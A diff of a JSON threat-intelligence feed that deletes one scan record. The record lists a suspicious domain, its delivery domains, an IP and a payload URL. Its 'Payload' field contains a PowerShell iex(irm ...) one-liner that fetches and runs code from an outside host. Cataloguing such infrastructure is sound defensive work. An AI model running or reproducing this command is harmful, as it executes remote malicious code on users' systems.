@@ -6810,27 +6810,5 @@
     ],
     "ReportId": "cmwc8ghte05n20omlrpl5slpy",
     "ScannedAt": "2026-11-11T14:47:25.243000+00:00"
-  },
-  {
-    "UrlDomain": "qualitylanguage.com.br",
-    "DeliveryUrl": [
-      "herosdvakit.org",
-      "mon-blanc-02.cfd",
-      "thu-ipad-03.cfd",
-      "copiose.org"
-    ],
-    "PayloadUrl": [
-      "https://copiose.org/lom/62a9405c9735a1a7"
-    ],
-    "IP": [
-      "187.17.111.104"
-    ],
-    "Related": [],
-    "Payload": "iex(irm 'https://copiose[.]org/lom/62a9405c9735a1a7' -UserAgent 'WUA/8382bc918d' -Headers @{'X-WUA'='8382bc918d'})",
-    "ResolvedDownloadUrl": [
-      "https://copiose.org/lom/62a9405c9735a1a7"
-    ],
-    "ReportId": "cmwc8571t05i70omlhp2zg2vc",
-    "ScannedAt": "2026-11-11T14:38:38.104000+00:00"
   }
 ]
